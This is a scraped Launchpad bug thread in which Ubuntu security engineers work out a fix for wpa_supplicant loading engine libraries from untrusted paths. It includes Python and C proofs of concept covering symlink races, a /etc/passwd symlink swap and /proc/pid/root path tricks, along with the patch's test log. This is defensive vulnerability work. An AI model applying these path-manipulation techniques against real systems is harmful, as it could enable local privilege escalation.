&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;By component: {} ({})&quot;.format(fd, os.readlink(<wbr />&#x27;/proc/<wbr />self/fd/<wbr />{}&#x27;.format(<wbr />fd))))<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;os.close(<wbr />fd)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">That is a neat trick!

As you said, one option is to do a path prefix check. If we only include something like '/usr/lib', could user have modules installed elsewhere, like '/opt' or who knows where else?

Denylisting '/proc' would be problematic if procfs is mounted elsewhere.

As an alternative, since the issue is caused by /proc/pid/root allowing access to paths in other mount namespaces, what about "canonicalizing" the path, like realpath() would do? Just calling realpath() would be subject to a TOCTOU race condition, so this would have to be done using *at() calls, a bit like the following Python POC. This is a bit ugly and complicated for my liking and it feels like going down a rabbit hole, but I'm putting it here for others' consideration.


import os


def by_component_open(path):
    dir_fd = None
    max_iterations = 256
    while path:
        max_iterations -= 1
        if max_iterations == 0:
            raise RuntimeError
        try:
            component, path = path.split('/', 1)
        except ValueError:
            component, path = path, ''
        path = path.lstrip('/')
        if component == '':
            if dir_fd is not None:
                os.close(dir_fd)
            dir_fd = os.open('/', os.O_PATH)
            continue
        file_fd = os.open(component, os.O_PATH | os.O_NOFOLLOW, dir_fd=dir_fd)
        try:
            component = os.readlink('', dir_fd=file_fd)
        except FileNotFoundError:
            os.close(dir_fd)
            dir_fd = file_fd
        else:
            if path:
                path = os.path.join(component, path)
            else:
                path = component
            os.close(file_fd)
    return dir_fd


if __name__ == '__main__':
    import sys
    import traceback

    try:
        fd = os.open(sys.argv[1], os.O_RDONLY)
    except Exception:
        traceback.print_exc()
    else:
        print("Direct: {} ({})".format(fd, os.readlink('/proc/self/fd/{}'.format(fd))))
        os.close(fd)
    try:
        fd = by_component_open(sys.argv[1])
    except Exception:
        traceback.print_exc()
    else:
        print("By component: {} ({})".format(fd, os.readlink('/proc/self/fd/{}'.format(fd))))
        os.close(fd)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/20" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-26T14:55:24.956001+00:00" title="2024-07-26 14:55:24 UTC">on 2024-07-26</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/20"> #20</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+attachment/5800573/+files/trusted_path.patch" class="sprite haspatch-icon">trusted_path.patch</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/wpa/+bug/2067613/+attachment/5800573">Edit</a>
        
        (3.5 KiB,
        text/plain)
        
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I was going to suggest we just do a prefix path check, like the attached patch. While it is possible that existing users have put a library somewhere else than /usr/lib, it should be easy for them to fix it.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I was going to suggest we just do a prefix path check, like the attached patch. While it is possible that existing users have put a library somewhere else than /usr/lib, it should be easy for them to fix it.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/21" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-26T18:24:10.745087+00:00" title="2024-07-26 18:24:10 UTC">on 2024-07-26</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/21"> #21</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+attachment/5800617/+files/trusted_path.patch" class="sprite haspatch-icon">trusted_path.patch</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/wpa/+bug/2067613/+attachment/5800617">Edit</a>
        
        (3.4 KiB,
        text/plain)
        
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Updated patch with a bit more info when logging as suggested by Luci.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Updated patch with a bit more info when logging as suggested by Luci.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/22" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~alexmurray" class="sprite person">Alex Murray (alexmurray)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-29T03:39:41.080091+00:00" title="2024-07-29 03:39:41 UTC">on 2024-07-29</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/22"> #22</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I think restricting to /usr/lib seems sufficient (assuming an unprivileged user can&#x27;t just mount something into it within their own namespace via a crafted FUSE module + overlayfs etc)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I think restricting to /usr/lib seems sufficient (assuming an unprivileged user can't just mount something into it within their own namespace via a crafted FUSE module + overlayfs etc)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/23" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~rmcnamara-snyk" class="sprite person">Rory McNamara (rmcnamara-snyk)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-29T08:51:18.257405+00:00" title="2024-07-29 08:51:18 UTC">on 2024-07-29</time><span class="editable-message-last-edit-date">
                <a href="#" class="editable-message-last-edit-link">(last edit <time itemprop="editTime" datetime="2024-07-29T11:47:04.964136+00:00" title="2024-07-29 11:47:04 UTC">on 2024-07-29</time>)</a>:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/23"> #23</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>EDIT: This is wrong, please ignore.</p>
<p>As mentioned in #19 it looks like the use of realpath in #21 is vulnerable to a race condition where the target of the path changes after the realpath and before the load. However, it will protect against the /proc/pid/root method outlined above, as the realpath of /proc/pid/<wbr />root/etc/<wbr />passwd is /etc/passwd.</p>
<p>You can call realpath against a /proc/self/fd file descriptor to check the prefix and then load from the same /proc/self/fd path, this should mitigate the issue I believe. The code below shows that even if you can &#x27;race&#x27; and swap the file for a symlink the load still happens against the original so this should be safe even where the original path is an untrusted symlink.</p>
<p>The use of iterative openat calls (like #19) with NOFOLLOW and a mandatory prefix is probably the safest method (This is how Google ChromeOS fixes a lot of path based vulnerabilities [1] which, anecdotally, is pretty effective).</p>
<p>#define _GNU_SOURCE<br />
#define _FILE_OFFSET_BITS 64<br />
#include &lt;stdio.h&gt;<br />
#include &lt;fcntl.h&gt;<br />
#include &lt;stdlib.h&gt;<br />
#include &lt;linux/limits.h&gt;<br />
#include &lt;unistd.h&gt;</p>
<p>int main(int argc, char *argv[]) {<br />
&nbsp;&nbsp;unlink(<wbr />&quot;testtarget&quot;<wbr />);</p>
<p>&nbsp;&nbsp;int testfd = creat(&quot;testtarget&quot;, 0777);<br />
&nbsp;&nbsp;write(testfd, &quot;testtarget\n&quot;, 11);</p>
<p>&nbsp;&nbsp;int influencedfd = open(&quot;/<wbr />proc/self/<wbr />fd/3&quot;, O_RDONLY); // this is testfd</p>
<p>&nbsp;&nbsp;char rp[PATH_MAX];</p>
<p>&nbsp;&nbsp;// &#x27;check&#x27; the prefix<br />
&nbsp;&nbsp;realpath(<wbr />&quot;/proc/<wbr />self/fd/<wbr />4&quot;, rp); // this is influencedfd<br />
&nbsp;&nbsp;printf(&quot;%s\n&quot;, rp);</p>
<p>&nbsp;&nbsp;// fake a TOCTOU file replace<br />
&nbsp;&nbsp;unlink(<wbr />&quot;testtarget&quot;<wbr />);<br />
&nbsp;&nbsp;symlink(<wbr />&quot;/etc/passwd&quot;<wbr />, &quot;testtarget&quot;);</p>
<p>&nbsp;&nbsp;// &#x27;check&#x27; the prefix<br />
&nbsp;&nbsp;realpath(<wbr />&quot;/proc/<wbr />self/fd/<wbr />4&quot;, rp); // this is influencedfd<br />
&nbsp;&nbsp;printf(&quot;%s\n&quot;, rp);</p>
<p>&nbsp;&nbsp;// fake loading the file<br />
&nbsp;&nbsp;int fakeload = open(&quot;/<wbr />proc/self/<wbr />fd/4&quot;, O_RDONLY);<br />
&nbsp;&nbsp;char buf[32];<br />
&nbsp;&nbsp;write(1, buf, read(fakeload, &amp;buf, 32));<br />
}</p>
<p>[1] <a rel="nofollow" href="https://chromium.googlesource.com/chromiumos/platform2/+/HEAD/libbrillo/brillo/files/safe_fd.cc">https:/<wbr />/chromium.<wbr />googlesource.<wbr />com/chromiumos/<wbr />platform2/<wbr />+/HEAD/<wbr />libbrillo/<wbr />brillo/<wbr />files/safe_<wbr />fd.cc</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">EDIT: This is wrong, please ignore.

As mentioned in #19 it looks like the use of realpath in #21 is vulnerable to a race condition where the target of the path changes after the realpath and before the load. However, it will protect against the /proc/pid/root method outlined above, as the realpath of /proc/pid/root/etc/passwd is /etc/passwd.

You can call realpath against a /proc/self/fd file descriptor to check the prefix and then load from the same /proc/self/fd path, this should mitigate the issue I believe. The code below shows that even if you can 'race' and swap the file for a symlink the load still happens against the original so this should be safe even where the original path is an untrusted symlink.

The use of iterative openat calls (like #19) with NOFOLLOW and a mandatory prefix is probably the safest method (This is how Google ChromeOS fixes a lot of path based vulnerabilities [1] which, anecdotally, is pretty effective).

#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;linux/limits.h&gt;
#include &lt;unistd.h&gt;

int main(int argc, char *argv[]) {
  unlink("testtarget");

  int testfd = creat("testtarget", 0777);
  write(testfd, "testtarget\n", 11);

  int influencedfd = open("/proc/self/fd/3", O_RDONLY); // this is testfd

  char rp[PATH_MAX];

  // 'check' the prefix
  realpath("/proc/self/fd/4", rp); // this is influencedfd
  printf("%s\n", rp);

  // fake a TOCTOU file replace
  unlink("testtarget");
  symlink("/etc/passwd", "testtarget");

  // 'check' the prefix
  realpath("/proc/self/fd/4", rp); // this is influencedfd
  printf("%s\n", rp);

  // fake loading the file
  int fakeload = open("/proc/self/fd/4", O_RDONLY);
  char buf[32];
  write(1, buf, read(fakeload, &amp;buf, 32));
}


[1] https://chromium.googlesource.com/chromiumos/platform2/+/HEAD/libbrillo/brillo/files/safe_fd.cc</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/24" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-29T11:26:47.805367+00:00" title="2024-07-29 11:26:47 UTC">on 2024-07-29</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/24"> #24</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hi Rory,</p>
<p>In patch #21, I&#x27;m not sure how the path could change between the realpath and the load since we&#x27;re making sure the path prefix is /usr/lib and we&#x27;re loading the realpath, not the original path. What am I missing?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hi Rory,

In patch #21, I'm not sure how the path could change between the realpath and the load since we're making sure the path prefix is /usr/lib and we're loading the realpath, not the original path. What am I missing?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/25" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-29T11:36:42.668229+00:00" title="2024-07-29 11:36:42 UTC">on 2024-07-29</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/25"> #25</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>(unprivileged users can&#x27;t replace files in /usr/lib...)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">(unprivileged users can't replace files in /usr/lib...)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/26" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~rmcnamara-snyk" class="sprite person">Rory McNamara (rmcnamara-snyk)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-29T11:46:47.300759+00:00" title="2024-07-29 11:46:47 UTC">on 2024-07-29</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/26"> #26</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>My apologies, I&#x27;m wrong. I misread the code. Please ignore #23 :)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">My apologies, I'm wrong. I misread the code. Please ignore #23 :)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/27" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sudhackar" class="sprite person">Sudhakar Verma (sudhackar)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-31T08:29:46.227212+00:00" title="2024-07-31 08:29:46 UTC">on 2024-07-31</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/27"> #27</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Testing with Marc&#x27;s patch in #21</p>
<p>```<br />
wpa_supplicant.<wbr />service - WPA supplicant<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Loaded: loaded (/usr/lib/<wbr />systemd/<wbr />system/<wbr />wpa_supplicant.<wbr />service; enabled; preset: enabled)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Active: active (running) since Wed 2024-07-31 13:01:31 IST; 57min ago<br />
&nbsp;Invocation: c3ab2d474e8844f<wbr />ab28ceb8868cf84<wbr />22<br />
&nbsp;&nbsp;&nbsp;Main PID: 5140 (wpa_supplicant)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Tasks: 1 (limit: 3397)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory: 1.6M (peak: 1.8M)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CPU: 36ms<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CGroup: /system.<wbr />slice/wpa_<wbr />supplicant.<wbr />service<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└─5140 /usr/sbin/<wbr />wpa_supplicant -u -s -O &quot;DIR=/run/<wbr />wpa_supplicant GROUP=netdev&quot;</p>
<p>Jul 31 13:02:46 sec-oracular-amd64 wpa_supplicant[<wbr />5140]: wlx00e04d1d0075: Associated with 00:31:92:b0:55:7e<br />
Jul 31 13:02:46 sec-oracular-amd64 wpa_supplicant[<wbr />5140]: wlx00e04d1d0075: CTRL-EVENT-<wbr />SUBNET-<wbr />STATUS-<wbr />UPDATE status=0<br />
Jul 31 13:02:46 sec-oracular-amd64 wpa_supplicant[<wbr />5140]: wlx00e04d1d0075: WPA: Key negotiation completed with 00:31:92:b0:55:7e [PTK=CCMP GTK=CCMP]<br />
Jul 31 13:02:46 sec-oracular-amd64 wpa_supplicant[<wbr />5140]: wlx00e04d1d0075: CTRL-EVENT-<wbr />CONNECTED - Connection to 00:31:92:b0:55:7e completed [id=0 id_str=]<br />
Jul 31 13:02:46 sec-oracular-amd64 wpa_supplicant[<wbr />5140]: bgscan simple: Failed to enable signal strength monitoring<br />
Jul 31 13:51:44 sec-oracular-amd64 wpa_supplicant[<wbr />5140]: ENGINE: Failed to load OpenSC Engine from /tmp/stage/<wbr />loadable.<wbr />so: Not in trusted path /usr/lib/<br />
Jul 31 13:51:44 sec-oracular-amd64 wpa_supplicant[<wbr />5140]: SSL: Failed to initialize TLS context.<br />
Jul 31 13:51:44 sec-oracular-amd64 wpa_supplicant[<wbr />5140]: Failed to initialize EAPOL state machines.<br />
Jul 31 13:51:44 sec-oracular-amd64 wpa_supplicant[<wbr />5140]: lo: CTRL-EVENT-<wbr />DSCP-POLICY clear_all<br />
Jul 31 13:51:44 sec-oracular-amd64 wpa_supplicant[<wbr />5140]: lo: CTRL-EVENT-<wbr />DSCP-POLICY clear_all<br />
```</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Testing with Marc's patch in #21 

```
wpa_supplicant.service - WPA supplicant
     Loaded: loaded (/usr/lib/systemd/system/wpa_supplicant.service; enabled; preset: enabled)
     Active: active (running) since Wed 2024-07-31 13:01:31 IST; 57min ago
 Invocation: c3ab2d474e8844fab28ceb8868cf8422
   Main PID: 5140 (wpa_supplicant)
      Tasks: 1 (limit: 3397)
     Memory: 1.6M (peak: 1.8M)
        CPU: 36ms
     CGroup: /system.slice/wpa_supplicant.service
             └─5140 /usr/sbin/wpa_supplicant -u -s -O "DIR=/run/wpa_supplicant GROUP=netdev"

Jul 31 13:02:46 sec-oracular-amd64 wpa_supplicant[5140]: wlx00e04d1d0075: Associated with 00:31:92:b0:55:7e
Jul 31 13:02:46 sec-oracular-amd64 wpa_supplicant[5140]: wlx00e04d1d0075: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
Jul 31 13:02:46 sec-oracular-amd64 wpa_supplicant[5140]: wlx00e04d1d0075: WPA: Key negotiation completed with 00:31:92:b0:55:7e [PTK=CCMP GTK=CCMP]
Jul 31 13:02:46 sec-oracular-amd64 wpa_supplicant[5140]: wlx00e04d1d0075: CTRL-EVENT-CONNECTED - Connection to 00:31:92:b0:55:7e completed [id=0 id_str=]
Jul 31 13:02:46 sec-oracular-amd64 wpa_supplicant[5140]: bgscan simple: Failed to enable signal strength monitoring
Jul 31 13:51:44 sec-oracular-amd64 wpa_supplicant[5140]: ENGINE: Failed to load OpenSC Engine from /tmp/stage/loadable.so: Not in trusted path /usr/lib/
Jul 31 13:51:44 sec-oracular-amd64 wpa_supplicant[5140]: SSL: Failed to initialize TLS context.
Jul 31 13:51:44 sec-oracular-amd64 wpa_supplicant[5140]: Failed to initialize EAPOL state machines.
Jul 31 13:51:44 sec-oracular-amd64 wpa_supplicant[5140]: lo: CTRL-EVENT-DSCP-POLICY clear_all
Jul 31 13:51:44 sec-oracular-amd64 wpa_supplicant[5140]: lo: CTRL-EVENT-DSCP-POLICY clear_all
```
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/28" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lucistanescu" class="sprite person">Luci Stanescu (lucistanescu)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-02T12:29:08.265362+00:00" title="2024-08-02 12:29:08 UTC">on 2024-08-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/28"> #28</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  <a href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/comments/28/+download">Download full text</a> (5.8 KiB)
  <div class="editable-message-body">
